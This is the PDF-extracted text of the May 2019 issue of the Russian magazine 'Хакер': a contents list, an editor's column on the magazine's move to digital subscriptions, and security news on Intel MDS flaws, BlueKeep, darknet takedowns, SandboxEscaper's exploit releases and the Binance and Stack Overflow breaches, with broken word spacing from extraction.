

                                              Май 2019
            № 242
CONTENTS

    Содер жание предыду щих серий
  Колон ка главреда

    MEGANews
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

     Luke, I am your fuzzer
  Автоматизируем поиск уязвимостей в программах

    Фаззинг глазами программиста
  Как в Google авто матизируют поиск багов

    Побег плохого адми на
  Как обой ти защиту от адми на и обма нуть антивирус

    Начинаем со Smali
  Как реверсить приложе ния для Android

    Проект Red Team
  Колон ка Дениса Мак рушина

    Ата ка на хостинг
  Как я раскрутил эска лацию привилегий в Plesk

    Кар манные трояны
  Как работа ют мобильные бан керы

    FUCK 2FA!
  Обходим двухфакторную аутен тифика цию с помощью Modlishka

    Сливаем Conﬂuence
  Как эксплуати ровать path traversal и RCE в кор поративной вики

    Крат кий справоч ник ано нима
  Виды шифрования и защиты тра фика, выбор софта

    Вре дитель ский кон троль
  Чем опасны приложе ния для огра ничения функций iPhone

    Всевидящее око DPI
  Учим ся обма нывать ана лизатор и сохранять свой тра фик в сек рете

    От ладка MIPS
  Как я собрал рабочий инс тру мент из сло ман ных запчастей

    Внут ри x86‐64 SystemV ABI
  Как говорить с ядром Linux на его языке

    Социн женерия в кино
  7 филь мов, по которым можно изучать социальную инженерию

     Тит ры
  Кто дела ет этот журнал
HEADER


  СОДЕРЖАНИЕ
  ПРЕДЫДУЩИХ
     СЕРИЙ

         КОЛОНКА ГЛАВРЕДА





Знаешь ли  ты, что в начале 2019 года
в «Хакере» сменился глав ный редактор?
Если не знаешь, зна чит, все идет хорошо
и никаких катаклизмов на издание я за это
время не навлек. Ура! Зато сейчас впервые       Андрей Письменный                                                                                      Главный редактор
за эти полгода  у меня появилась  воз‐         apismenny@gmail.com
можность  немного  выдохнуть  и,  отор‐
вавшись от редактуры и разгребания почты,
показаться на глаза читателям.


Не удивлюсь, если и имя предыду щего главреда у тебя тоже не на слу ху, ведь
он предпочитал режим почти что полного стел са и тексты, подобные этому,
писать наотрез отказывался. Илья Русанен руково дил редакцией с кон‐
ца 2014 года, сменив на этом пос ту Илью Илембитова. Оба они — выход цы
из редакции Степы Ильина, при котором «Хакер» растерял остатки былой
кислотности, повзрослел и стал замет но пристойнее.
  Я же в 2013 году уволился из доживавшей последние годы «Компьютер‐
ры», в онлайновом подразделении которой проработал шесть лет, и принял‐
ся пописывать  статейки,  потихоньку подыскивая новое место  работы.
«Хакер», как и «Компьютерра», в студенческие времена был моим любимым
чтивом, поэтому постучаться в почту Степе в поисках заказов было совер‐
шенно естествен ным шагом.
   Кстати, из своих статей в «Хакере» лучшими я считаю именно те —
написанные в 2013–2014 годах: смот ри, нап ример, «Freaks and Geeks», «Ис‐
торию ARM», «Цифровую археологию», «GUI, которые мы потеряли»… Эх,
хорошие были времена! Когда еще я смогу себе позволить работать над тек‐
стами по две недели, ни на что не отвлекаясь?
   Заступив на пост главреда, Илья Русанен пригласил меня на пос тоянную
работу — сначала на должность редактора рубрик PC Zone и «Сцена»,
а потом — шеф‐редактора, куриру ющего заодно темы номера и другие вещи
тут и там. Примерно в то же время он рекрутировал и Алексея Глазкова —
в качестве выпускающего редактора и прос то мас тера на все руки.
  Собственно, втроем с Ильей и Лешей мы и придумали, как превратить
культовый бумажный журнал  «Хакер»  в  контентный  сайт  с подписной
моделью. Не сказать, что у нас был выбор. Владелец и основатель издатель‐
ского дома GameLand Дима Ага рунов поставил нас перед фактом: «бумага»
больше не окупается и будет закрыта, выживать за счет рекламы — не вари‐
ант (рекламный рынок тогда как раз схлопнулся в честь финансового кри‐
зиса), и мы будем продавать подписку на электронную версию. Не сработа‐
ет — значит, не судьба.
   Сказать, что бумажный журнал было жаль, — не сказать ничего, да и
в успех электронного рас простра нения у нас никто (кроме Димы) тогда
не верил. Но горевать нам было некогда: нуж но было срочно обновлять сайт
и на ходу придумывать новую схему работы, которая позволила бы совмещать
ежедневные публикации с версткой PDF и подготовкой версии для iPad.
  Надо сказать, что и читатели сна чала с недоверием восприняли идею
цифрового распространения по подписке. Все же доступ к платным матери‐
алам сайта — не то же, что глянцевый журнал, хоть и имеет свои плюсы. Все
это нам хорошо известно. Поэто му мы попытались при ложить все силы, что‐
бы сохранить то, за что читателям полюбился «Хакер», но приспособить эти
вещи к цифровым реалиям.
  И вот через четыре с половиной года, несмотря на все опасения, полет
по‐прежнему нормальный. И зас луга это не только наша, но и читателей,
которые решили поддержать нас руб лем и оформить подписку. Огромное
вам спасибо за это! Как бы банально это ни зву чало, без вас никакого
«Хакера» бы не было. Именно благода ря вашей поддержке мы продолжаем
делать те статьи, которые вы читаете, и платить авторам за их труд.
  Изменится ли что‐то в «Хакере» со мной в качес тве главреда? Пос мотрим!
С некоторым сожале нием признаюсь, что пока не делал ничего такого, что
мне раньше зап рещал бы делать Илья, — например, писать в статьях слово
«трахаться». Упс!
  А если серьезно, то, пока мы работаем, обязатель но будут и новые вещи.
Ты, например, мог заметить, что рядом с твоим именем на сайте появилась
какая‐то загадочная цифра. Это заработала система скоринга, которую мы
сейчас тестируем. Она оценивает дей ствия поль зовате лей на сайте и под‐
считывает рейтинг в зависимости от степени их активнос ти. Как только
доделаем — будет чуть более официальный анонс с подробностями.
  Я же планирую вернуться с аналогичной колонкой через месяц и рас ска‐
зать еще что‐нибудь о том, чем живет редакция «Хакера». А потом еще через
месяц. И еще. Думаю, ты понял идею! :‐)
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





RIDL, FALLOUT
И ZOMBIELOAD
За полтора года, прошедшие с момента обнаружения оригинальных проблем
Meltdown и Spectre, было найдено немало «смежных» уязвимостей, работа‐
ющих похожим образом, свя занных с ата ками по сторонним каналам и спе‐
кулятивными вычислениями.
  В середине мая ученые рас крыли детали нового класса уязвимостей
в процессорах компании Intel — Microarchitectural Data Sampling (MDS). Равно
как и уязвимости Spectre и Meltdown, новые баги связаны с упреждающим
(или спекулятивным — speculative) механизмом исполнения команд. Иссле‐
дователи выделили четыре уязвимос ти и три группы проблем: RIDL, Fallout
и ZombieLoad. Уязвимос ти получили следующие идентификаторы и названия
(указывают, на какой именно компонент про цес сора направле на атака):
 • CVE‐2018‐12126 — Microarchitectural Store Buﬀer Data Sampling (MSBDS);
 • CVE‐2018‐12130 — Microarchitectural Fill Buﬀer Data Sampling (MFBDS);
 • CVE‐2018‐12127 — Microarchitectural Load Port Data Sampling (MLPDS);
 • CVE‐2019‐11091 — Microarchitectural Data Sampling Uncacheable Memory
  (MDSUM).

Все эти баги позволяют ата кующему похищать пароли, криптографичес кие
клю чи и прочие личные данные, загруженные или хранящиеся в памяти
буферов процессора. По данным экспертов, перед этими проблемами уяз‐
вимы все процессоры Intel, выпущенные после 2008–2011 годов. Список всех
уязвимых процессоров можно увидеть здесь.
  Наиболее опасной из новых уязвимостей считается ZombieLoad, позволя‐
ющая злоумышленнику получить дос туп к боль шему количеству данных. Так,
в одном из показанных исследователями примеров уязвимость используется
для мониторинга того, какие сайты посещает пользователь, работающий
на виртуальной машине через Tor Browser. То есть ZombieLoad помогает
эффективно обходить все защитные механизмы между при ложениями.
  Исправление RIDL,  Fallout и ZombieLoad потребует не только патчей
на уровне софта, но и обновления микрокодов процессоров. Но есть
и хорошие новости. Во‐первых, описанные исследователями атаки неопасны
для новейших поколений процессоров  Intel. Во‐вторых, на этот раз пуб‐
ликация информации о проблемах не застала Intel и других производителей
врасплох. Инженеры  Intel уже подготовили микрокоды, а производители
ПО патчи.
  К тому же в официальном заявлении предста вители Intel отмечают, что
атаки на уязвимость ZombieLoad и две другие проб лемы вряд ли будут воз‐
можны в реальной жизни из‐за целого ряда сопряженных с эксплуатацией
сложностей.
  Компания AMD, в свою очередь, официально подтвердила то, о чем
писали исследователи: процессоры компании не подвержены новым проб‐
лемам. Дело в том, что уяз вимости также тесно связаны с использованием
технологии гиперпоточ ности (Hyper‐Threading), созданной компанией  Intel
для собственных своих продуктов. AMD это, по понят ным причинам, не каса‐
ется.
   Также уже были опубликованы интересные данные о вероятном снижении
производительности процессоров после уста новки патчей. Представители
Intel уверяют, что производительность процес соров может снизиться ори‐
ентировочно на 10%, но в то же время компания Apple писала о веро‐
ятных 40%.
  В итоге эксперты Phoronix провели собственное независимое тестирова‐
ние, проверив, как патчи для MDS‐уяз вимос тей, а также для проблем Spectre,
Meltdown и L1TF сказываются на про изво дительности раз личных систем.
Результаты тестов выглядят удру чающе: в среднем процессоры Intel теряют
в производительности 16% без отключения Hyper‐Threading и все 25%, если
Hyper‐Threading отключен. При этом процессоры AMD, которые тоже уязвимы
перед  частью  side‐channel‐атак,  после  установки  обновлений  теряют
лишь 3% своей производительности.


200 000 000 ДОЛЛАРОВ ОТМЫЛ BESTMIXER.IO
Сервис Bestmixer.io, предлагавший свои услуги по отмыванию Bitcoin, Bitcoin cash и Litecoin,
был закрыт правоохранительными органами Нидерландов, Люксембурга и Европолом.


Операторы сайта очень детально описывали, зачем кому‐либо могут понадобиться их услу ги,
отмечая в рекламе, что борьба с отмыванием денег — дело нешуточное, а их сервис поможет
сделать средства «чистыми», анонимными и неотслеживаемыми.

За год работы через сайт прошло примерно 27 000 BTC, то есть порядка 200 000 000 дол‐
ларов США, а его операторы получали около 600 000 дол ларов в месяц.

В результате проведенной спецоперации в руках представителей Нидерландско го управле ния
по преследованию финансовых преступлений оказалась информация обо всех тран закциях
Bestmixer со времени создания ресурса (IP-адреса, детали тран закций, bitcoin-адреса
и сообщения из чатов). Теперь правоохраните ли намерены изучить эти данные и поделить‐
ся ими с коллегами из других стран.





МАРКЕТПЛЕЙСЫ
ДАРКНЕТА
В этом месяце правоох ранители закрыли сразу нес колько крупных ресурсов
в даркнете и сайтов, косвенно свя занных с незаконной деятельностью.


Wall Street Market и Valhalla
В конце апре ля мы уже рас ска зывали о крайне неспокойной обстановке,
воцарившейся на популярной в даркнете торговой площадке Wall Street Mar‐
ket (WSM). Напомню, что администра ция маркетплей са, похоже, присвоила
десятки миллионов долларов, принадлежавших клиентам, и скрылась, а на
WSM воцарился настоящий хаос, хотя сайт еще продолжал работу.
   Теперь правоох ранительные орга ны Германии, Нидерландов, США, Фин‐
ляндии, Франции, а также представители Европола сообщили о ликвидации
сразу двух маркетплейсов: Wall Street Market и Valhalla (он же Silkkitie), зак‐
рытого в начале года.
  Официальное заявление гласит, что в конце апреля текуще го года
Генеральная прокуратура Франкфурта‐на‐Май не и федеральное ведомство
уголовной полиции Германии (при под держке Евро пола, Евроюста, а также
коллег из Нидерландов и раз личных ведомств США) арестовали трех неназ‐
ванных подозреваемых, свя занных с Wall Street Market, а вместе с этим в США
были задержаны два крупнейших продавца наркотиков, использовавших
WSM.
  По информации следствия, на WSM в общей сложности было зарегистри‐
ровано более 1 150 000 пользователей и 5400 продавцов и маркетплейс был
второй по величине подпольной торговой площадкой в мире.
  Во  время  обысков  у  предполага емых  операторов WSM  нашли
более 550 000 евро наличными, а также шес тизначные суммы в криптовалю‐
тах Bitcoin и Monero, несколько автомобилей и огнес трельное оружие. Кроме
того, были обнаружены и другие улики, включая компьютеры и накопители
данных.
  Финские власти, в свою очередь, сообщили об изъятии серверов маркет‐
плейса Valhalla и значительного количества криптовалюты, однако они не про‐
изводили арестов.
  Интересно, что в кон це апреля один из бывших модераторов Wall Street
Market, Med3l1n, опубликовал в открытом дос тупе свои учетные данные и IP‐
адрес WSM (судя по этим данным, сайт хос тился в Голландии). Так что любой
желающий,  включая  предста вителей  правоохранительных  органов,  мог
получить полный доступ к бэкенду торговой пло щадки и деанонимизировать
продавцов и покупателей.
   Спустя шесть дней после этого ресурс начал работать с перебоями, а еще
через два дня ушел в офлайн окончательно, и пра воохранители официально
заявили о проведении операции по его закрытию. Не совсем ясно, были ли
эти два события связаны друг с дру гом. Также пока можно только гадать,
успели администраторы Wall Street Market скрыть ся с деньгами пользовате‐
лей или экзит‐скам все же завершился арестом, а WSM какое‐то время
находился под контролем правоохранителей.


DeepDotWeb
ФБР, Европол, а также пра воохранительные орга ны Германии, Израиля,
Нидерландов и Бразилии про вели еще одну совмес тную операцию, в резуль‐
тате которой был закрыт сайт DeepDotWeb, расска зывавший о новостях дар‐
кнета и каталогизировавший ресурсы «изнанки интернета».
   Этот «путево дитель по даркнету» наверняка зна ком нашим читателям: он
обновлялся ежедневно, оперативно сооб щал о закрытии тех или иных ресур‐
сов, их новых адресах, экзит‐ска ме, рас ска зывал о других проблемах тор‐
говых площадок.
  В Израиле, по данным местных СМИ, были арестованы два оператора
DeepDotWeb. Другие аресты также были про изведены в Германии, Франции,
Нидерландах и Бразилии.
  Однако дело, конечно, было не в новос тях. Следствие утверждает, что
операторы DeepDotWeb получа ли комиссию за перенаправление трафика
на нелегальные сайты в даркнете. В каталоге DeepDotWeb свободно пуб‐
ликовались ссылки на любые ресурсы, включая торговые площадки в даркне‐
те, где продают и покупают оружие, наркотики, малварь, ворованную
информацию, пор нографию и многое другое. Впро чем, пока правоохраните‐
ли не конкретизируют, о какой именно «комиссии» и в каком раз мере идет
речь. По данным журналис тов TechCrunch, админис трация сайта зарабатыва‐
ла на своем катало ге .onion‐ссылок миллионы дол ларов.


ХАКТИВИЗМ ЗАКОНЧИЛСЯ?
Специалисты IBM X‐Force опубликовали исследование, посвященное краху хак тивистско го дви‐
жения, произошедшему в последние годы. Исследователи пишут, что хактивизм вряд ли окон‐
чательно «мертв», однако пока определен но находится в упадке. Изменения порождены двумя
основными факторами: «смертью» Anonymous, а также прис тальным вниманием со сто‐
роны правоохранительных органов.

Уровень активности хактивистов снизил ся на 95% по сравнению с 2015 годом. В 2015 году
было зафиксировано 35 подобных инцидентов, но уже в 2017 году обнаружили всего 5,
в 2018 году 2, а в первые месяцы текущего года и вовсе ни одно го.





Хакерский коллектив Anonymous ранее был ответс твенен пример но за 45% всех атак хактивис‐
тов, то есть держался с огромным отрывом от ближайших конкурентов в лице групп Lizard
Squad и DownSec.





Без лидера и единой идеологии в стане Anonymous воцарил ся нас тоящий хаос, а движение
оказалось расколото на множество мел ких подгрупп, чьи атаки были порой неэффективны,
причиняли вред невинным людям и вызывали только презрение и насмешки. Также с 2011 года
в США, Великобритании и Турции арес товали по меньшей мере 62 хактивис та (и это только
те аресты, о которых известно широкой обществен ности).





НОВЫЕ ЭКСПЛОИТЫ
SANDBOXESCAPER
Независимая ИБ‐специалис тка, известная под псевдонимом SandboxEscap‐
er, обнародовала новую порцию PoC‐экс плоитов для еще не исправленных
уязвимостей в Windows.
  Нужно отме тить, что это далеко не первый раз, когда исследовательница
публикует экспло иты для свежих проб лем в Windows, не дожидаясь выхода
исправлений. Например, первый 0day исследова тельница раскры ла в конце
лета 2018 года, о второй проблеме нулево го дня она сообщила в конце
октября 2018 года, а в декабре об народовала уже третий PoC.
  На этот раз SandboxEscaper начала с расска за о проблеме локального
повышения привилегий в Windows 10, которая не поз волит атакующему про‐
никнуть в систему, но поз волит закрепиться в ней и раз вить уже начатую атаку
далее. Проблема связана с работой планировщика заданий (Windows Task
Scheduler): злоумышленник может запустить вредонос ный файл .job и при
помощи бага внести изменения в DACL (discretionary access control list).
   Proof‐of‐concept экспло ит, протестированный на 32‐разрядной версии
Windows 10, был опубликован на GitHub. При этом исследовательница утвер‐
ждает, что проблема также актуальна и для более старых версий ОС, вплоть
до Windows XP и Server 2003.
   Вскоре после первой публикации SandboxEscaper раскрыла информацию
еще о двух уязвимостях, также выложив экс плоиты для них в открытый доступ.
  Еще одна проб лема свя зана с сервисом Windows Error Reporting и получи‐
ла название AngryPolarBearBug2. Этот баг представляет собой локальное
повышение привилегий и очень похож на проблему AngryPolarBearBug,
которую специалистка описывала еще в декабре прошлого года. Фактически
с его помощью атакующий может получить доступ к редактированию файлов,
которого он в нор мальных обстоятельствах иметь не должен. SandboxEscaper
отмечает, что воспользоваться этой уязвимостью будет нелегко, так как для
эксплуатации бага может потребовать ся более пятнадцати минут.
  Проблема AngryPolarBearBug2 — это не уязвимость нулевого дня. Спе‐
циалисты  Palo  Alto Networks замети ли, что PoC исследовательницы —
это фактически экспло ит для уяз вимос ти CVE‐2019‐0863, которая была
исправлена инженерами Microsoft в мае текущего года. Стоит заметить, что
к моменту выхода патча проблема CVE‐2019‐0863 уже активно исполь‐
зовалась злоумышленниками.
   Третья проблема затрагива ет браузер Internet Explorer 11. Этот баг поз‐
воляет инжектировать вредоносный код в IE, одна ко его не выйдет исполь‐
зовать удаленно, что существенно снижает опасность проблемы.
  Но на этом SandboxEscaper не остановилась. На следующий же день спе‐
циалистка продол жила публикацию эксплоитов и раскрыла информацию
еще о двух багах нулевого дня.
   Четвертая проб лема поз воляет обой ти пат чи для уязвимости CVE‐2019‐
0841, которую инженеры Microsoft исправили в апреле 2019 года. Данная уяз‐
вимость связана с Windows AppX Deployment Service (AppXSVC) и поз воляет
локально повысить привилегии в системе.
  Пятая уязвимость связана с Windows Installer (C:\Windows\Installer). Sand‐
boxEscaper пишет, что в короткий отрезок времени из‐за состояния гонки
можно вмешаться в процесс уста новки при ложения Windows и помес тить
файлы в недозволенные области ОС. Баг эксплуатирует функци ональность
msiexec /fa (используется для устранения ошибок установки) и поз воляет
злоумышленнику поместить малварь в произволь ное место, тем самым
повысив свои права. То есть данная уяз вимость тоже связана с локальным
повышением привиле гий.
  Представите ли Microsoft пока никак не отреаги ровали на публикацию всех
этих эксплоитов. Учитывая, что ни одна проблема не допускает удаленного
исполнения произвольного кода, можно предположить, что патчи выйдут
не раньше следующе го «вторника обновлений».


НАБИУЛЛИНА ПРОТИВ ВНЕД РЕНИЯ КРИПТОВАЛЮТ
Выступая в Госдуме, глава ЦБ РФ высказалась про тив внедрения криптовалют в денежную сис‐
тему.





→«Мы, в принципе, конечно, против того, чтобы криптовалюты запускались в нашу денежную
систему. Мы не видим этой возможности, чтобы криптовалюты, по сути дела, выполняли здесь
функцию денежных сур рогатов. В этой части точно нет.
   Что касается взаиморасчетов, то мы рассмотрим, конечно, предложение по тому, что такое
криптовалюта, привязанная к золоту. Но, на мой взгляд, важнее раз вивать расчеты в наци‐
ональных валютах»
— цитата из речи Эльвиры Набиуллиной





ПОТЕНЦИАЛЬНЫЙ
ЧЕРВЬ
В рамках майского «вторника обновлений» компания Microsoft исправила
критическую  уязвимость  CVE‐2019‐0708  (она же  BlueKeep),  связанную
с работой Remote Desktop Services (RDS) и RDP.
   Хотя технические детали проблемы не раскрываются из‐за ее высокой
серьезности, известно, что с помощью этого бага атакующие могут выпол‐
нять произвольный код без авторизации и рас пространять свою малварь
подобно червю, как, например, было с извес тными вре доносами WannaCry
и NotPetya. Проблема опасна для Windows Server 2008, Windows 7, Windows
2003 и Windows XP, для которых были выпущены об новления безопасности.
  Для проблемы, которая может стать вторым WannaCry, уже были созданы
PoC‐эксплоиты,  их продемонстрирова ли специалисты сразу нескольких
ИБ‐компаний (вклю чая McAfee, Check Point и «Лабораторию Касперского»)
и независимые исследователи. Пока код этих экс плоитов не был опубликован
в открытом доступе из‐за слишком высокого рис ка.
  Специалисты NCC Group, в свою очередь, представили специальный за‐
щитный микропатч для BlueKeep, а ана литики RiskSense разработали спе‐
циальный инструмент, с помощью которо го можно проверить на уязвимость
перед BlueKeep весь парк корпоративных машин.
  Нужно сказать, что ИБ‐эксперты бьют тревогу совсем не зря. Так, спе‐
циалисты компании GreyNoise уже за фиксирова ли, что неизвестные активно
сканируют интернет в поисках уяз вимых систем. Атакующие, похоже, исполь‐
зуют для сканов модуль Metasploit, раз работанный экспертами RiskSense.
   Активность атакующих исходит исключительно с выходных нод  Tor, и,
похоже, все это деятельность всего одной хакерской группы. Эксперты
не обнаружили попыток экс плуатации уязвимос ти: хакеры пока лишь ищут
уязвимые системы, но не пыта ются их ломать. По мне нию экспертов
GreyNoise, это определен но подготови тельный этап перед последу ющими
атаками и ситуация ухуд шает ся.
  Изначально  предполагалось,   что  BlueKeep  представляет   угрозу
для 7,6 миллиона систем, но теперь аналитики заявляют, что это не так.
По статистике компании Errata Security, уязвимость по‐прежнему опасна лишь
для 950 тысяч систем. Оказалось, что порт 3389, откры тый на многих устрой‐
ствах, дезориентировал специалистов ранее: боль шинство этих машин вооб‐
ще не работают на Windows или не используют RDP на этом порте, а значит,
уязвимость CVE‐2019‐0708 им не угрожает.
  При этом в  Errata  Security ожидают, что хакеры напишут эксплоиты
для BlueKeep в ближайший месяц или два, а затем непропатченные системы,
уязвимые перед проб лемой, ждет волна атак и настоящий хаос.


CHROME 76: НАЧАЛО КОНЦА FLASH

После релиза июньского выпуска Chrome 76 разработчики Google планируют окончательно
отказаться от воспроизведения Flash‐контента по умол чанию. Данные изменения уже вошли
в экспериментальную ветку Сanary, на базе которой будет пос троен Chrome 76.

Пока поддержку Flash можно будет вернуть в нас тройках, но в декабре 2020 года, пос ле
релиза Chrome 87, под держка Flash будет прекращена совсем. Напомню, что, согласно заяв‐
лению Adobe, на это время зап ланирована окон чательная «смерть» технологии.


Разработчики Firefox тоже собираются отключить Flash по умол чанию. Эти изме нения зап‐
ланированы на сентябрь 2019 года и выпуск Firefox 69, хотя пользовате ли так же смо гут
вновь включить поддержку технологии до 2020 года.





ВЗЛОМ STACK
OVERFLOW
В середине мая представители Stack Overﬂow, круп нейшего в интерне те сай‐
та вопросов и ответов о программировании, сооб щили о кибератаке на свой
ресурс.
   Как говорится в кратком заявлении, опубликованном на сайте проекта,
11 мая 2019 года было обна ружено, что неизвес тные лица сумели проникнуть
во внутреннюю сеть компании. Пос коль ку на момент публикации этого сооб‐
щения расследование инцидента только началось, никаких подробностей
об атаке известно не было. Сообщалось, что разработчики оперативно
устраняют все использованные зло умышленниками уяз вимос ти и разбира‐
ются в произошедшем.
   17 мая компания обно вила свое заявление, выпустив более разверну тый
отчет об инциденте. Раз работчики сообщили, что неизвес тные злоумыш‐
ленники все же могли получить дос туп к пользовательским данным, хотя изна‐
чально предполагалось, что это не так. Хотя общая база данных пользовате‐
лей не была скомпрометирована, атакующие могли узнать IP‐адреса, имена
или email‐адре са небольшого числа пользователей Stack Exchange.
  В настоящее время предста вители Stack Overﬂow продол жают изучать
логи и разбираться с действиями хакеров. На данный момент точно извес тно
всего о 250 скомпрометированных пользователях. Всех пострадавших уже
адресно уведомили о случившемся.
  Кроме того, разработ чики уточнили, что про никновение в сеть произошло
еще 5 мая, через уязвимость на stackoverﬂow.com. То есть злоумышленники
оставались в системе почти неделю и проводи ли разведку и лишь потом
начали действовать, повысив свои привилегии, что и было замечено адми‐
нистрацией ресурса.
  В настоящее время Stack Overﬂow сотрудни чает со сторонней киберкри‐
миналистической компанией и продолжает рас следование инцидента. Дос‐
туп злоумышленника уже был отоз ван, уязвимос ти устранены, а также ком‐
пания продолжает тщательный внутренний аудит своего программного ком‐
плекса и проводит ряд мероприятий для улучшения систем защиты.
  Напомню, что это не пер вый гром кий взлом сайта вопросов и ответов.
В 2018 году стало известно об ата ке на Quora, в результате которой постра‐
дало более 100 миллионов пользователей.


СТАРЫЕ БАГИ
Эксперты компании Fidelis Cybersecurity изучили уязвимости, наиболее популярные у злоумыш‐
ленников в первом квартале 2019 года. Хотя «цен ность» уязвимос тей стре мительно снижается
сразу же после публикации патчей для них, злоумышленники не отказываются от эксплу атации
багов так быстро и продолжают исполь зовать их до тех пор, пока это позволяет взломать хоть
сколько‐нибудь стоящие цели.

Около 1/3 всех обнаруженных в пер вом квар тале проблем (экс пло иты, уязвимости, мал варь)
оказались датированы 2017 годом и ранее.

Самыми активными вредоносами были названы H-W0rm (Houdini) и njRAT — два тро яна уда‐
ленного доступа (RAT), существующие как минимум с 2012 года.





27% всех попыток ком прометации (более 550 000 расследованных инцидентов) были свя‐
заны с уязвимостями 2017 года и даже старше.
В итоге пятерка наиболее экс плуатируемых проб лем выг лядит следующим образом:

CVE-2017-8570 — RCE‐баг Composite Moniker, эксплоит дос тупен публично;

CVE-2017-0143 — проблема, затрагивающая SMBv1, эксплоит опубликован группой Shadow
Brokers (Eternal Synergy);

CVE-2018-11776 — RCE‐уязвимость в Apache Struts, экс плоит дос тупен пуб лично;

CVE-2017-11882 — RCE‐уязвимость в Microsoft Ofﬁce, экс плоит доступен публично;

CVE-2009-3129 — RCE‐уязвимость в Microsoft Excel/Word, задействованная в операции Red
October, эксплоит доступен публично.





                                     Продолжение статьи →
← Начало статьи





 КРИПТА
 НА 41 МИЛЛИОН
  В ночь с 7 на 8 мая 2019 года предста вители одной из крупнейших крип‐
  товалютных бирж в мире — Binance сооб щили, что ресурс пострадал от мас‐
  штабной и хорошо спланированной хакерской ата ки. В результате у биржи
  было похищено 7000 BTC (около 41 миллиона долларов по курсу на момент
   атаки), которые злоумышленники вывели одной транзакцией.
     Согласно официальному сооб щению Binance, хакерам удалось заполу‐
   чить большое количество API‐ключей, кодов двухфакторной аутентификации
  и других данных поль зователей. Для этого злоумыш ленники при менили мно‐
  жество разных техник, включая фишинг и заражение малварью. Расследова‐
  ние случившегося пока продолжается, поэтому специалисты биржи не исклю‐
   чают, что могут быть выявлены дополнительные векторы атак, а также новые
  пострадав шие учетные записи. Инцидент затронул только горячий BTC‐
  кошелек биржи, содержавший ~2% от общего объема биткойнов.
    Сообщается, что зло умышленники тщательно спланировали свою атаку
  и потратили много времени на ее подготовку, задействовав множество акка‐
   унтов, никак не связанных между собой на первый взгляд. В частности, тран‐
   закция, с помощью которой с биржи вывели средс тва, была подготовлена
  таким образом, чтобы защитные механизмы на нее не отреагировали. Ано‐
  малию зафиксировали лишь пос ле вывода криптовалюты, но было уже поз‐
   дно, и остановить транзакцию это не помогло.
     Из‐за атаки Binance была вынуж дена при остановить снятие и внесение
   средств, а сайт экстренно прекратил работу для про ведения рас следования,
  и в это время пользователи не смогут поль зоваться вводом/выводом
   средств, хотя торги продолжатся в штатном режиме.
     Представите ли Binance заверили, что атака никак не скажется на поль‐
  зователях биржи и их активах: ресурс обещает полностью компенсировать
  все потери с помощью фонда Secure Asset Fund for Users (SAFU), созданного
  именно для таких случаев. С лета 2018 года в SAFU перечисляется 10% всех
  биржевых сборов, и эти средства хранятся на отдель ном холодном кошельке.


  ХАКЕР ВОШЕЛ В ТРОЙКУ САМЫХ ЖЕЛАННЫХ ПРО ФЕС СИЙ
   Яндекс провел исследование и определил, кем хотят стать пользовате ли и в каких отраслях они
   предпочитают работать.


   Статистика была собрана на основе поисковых запросов со словами «как стать» и оце нивалась
   по 100-балльной шка ле — чем выше час тота запроса, тем выше балл.

  В 2018/19 году на первом месте оказалась профес сия блогера (100 баллов), затем депутата
   (82 балла) и хакера (50 бал лов). Также среди популярных запросов оказались миллионер,
   YouTube‐блогер, модель, нотариус и пилот.





 АТАКИ НА SHA‐1
 СТАЛИ РЕАЛЬНЕЕ
  Алгоритм  хеширования  SHA‐1  считается  ненадежным  и  «сломанным»
  еще с 2005 года: именно тогда эксперты заговорили о потенциальной воз‐
  можности взлома SHA‐1 через коллизионную ата ку, что в теории давало зло‐
  умышленникам возможность создать поддель ный файл с точно таким же
  хешем SHA‐1, как у настоящей версии фай ла.
     За прошедшее время специалис ты не раз пытались подступиться к этой
  проблеме с разных сто рон, и нас тоящий прорыв совершили инженеры
  Google в 2017 году. Они продемонстрировали миру атаку, названную SHAt‐
   tered. Тогда в качестве доказа тельства проделанной работы эксперты опуб‐
  ликовали два PDF‐файла с одинаковым хешем SHA‐1, а также был запущен
  отдельный сайт, посвященный взло му и ненадежности SHA‐1 в целом.
     Теперь сводная группа ученых из Сингапура и Франции пред ставила
  собственную вариацию коллизионной ата ки, в сущности улучшив SHAttered
  и сделав возможными ата ки с заданным префиксом.



        «Обна ружить прак тичес кую коллизионную ата ку, изме няющую хеш,
        бес спор но, плохо. Одна ко урон, который может нанес ти такая ата ка,
         весьма огра ничен, ведь злоумыш ленник прак тичес ки не контролиру ет
         коллизию данных. Гораз до инте рес нее обна ружить так называ емую
         ата ку с заданным пре фик сом, где злоумыш ленник волен сам выбрать
        пре фикс для двух сообщений», — объясняет один из иссле дова телей
        Томас Пейрин (Thomas Peyrin).

  Фактически это означает, что коллизионная ата ка на SHA‐1 перестает быть
  «лотереей»: атака с заданным префиксом поз воляет изменять подписанные
  SHA‐1 файлы  так,  как нужно прес тупни ку,  начиная  от подделки  биз‐
  нес‐документации и заканчивая сертификатами TLS.
    Более того, эксперты не просто доказа ли, что такие атаки возможны
  на практике, их сумели сделать быстрее и дешевле, то есть продемонс три‐
  ровали, что такое под силу и киберпреступникам.
      Так, считается, что классичес кая коллизионная атака на SHA‐1 в сред нем
                         77  требует проведения 2  операций, но ата ка с заданным пре фиксом должна
  быть куда сложнее и «дороже» в исполнении. Эксперты доказали, что это не
                                                 66     69   так: новая вариация атаки может требовать от 2  до 2  вычислений и стоить
  порядка 100 тысяч дол ларов США (что тоже эквивалентно SHAttered).





  При этом исследователи отмечают, что пока не проводили атаку на практике,
   так как изначальная стоимость коллизи онной атаки с заданным префиксом
  равнялась примерно миллиону долларов, а таких денег у экспертов попросту
  не было. Теперь, когда стоимость ата ки уда лось снизить до 100 тысяч, ана‐
   литики уже работают над практической реализаци ей своей теории и наде‐
  ются скоро обнародовать ито ги экспериментов.


  «5 МИЛЛИАРДОВ ДОЛЛАРОВ... НЕДОСТАТОЧ НО»
   Крис Хьюз, сооснователь Facebook, стоявший у истоков социальной сети в 2014 году наряду
   с Марком Цукербергом, Эдуардо Саверином и Дас тином Мос ковицем, написал большую колон‐
   ку для издания The New York Times. В тексте Хьюз раскритиковал Цукерберга и Facebook,
   заявив, что социальную сеть пора разрушить.





  →«Правительство должно заставлять Мар ка отчитываться. Законодате ли слишком долго вос‐
   хищенно наблюдали за взрывным ростом Facebook и упус тили из виду свою обязан ность
   защищать интересы американцев и обеспечивать рынку конкурентные условия. Со дня на день
   Федеральная торговая комиссия готовится оштрафовать компанию на 5 миллиардов долларов,
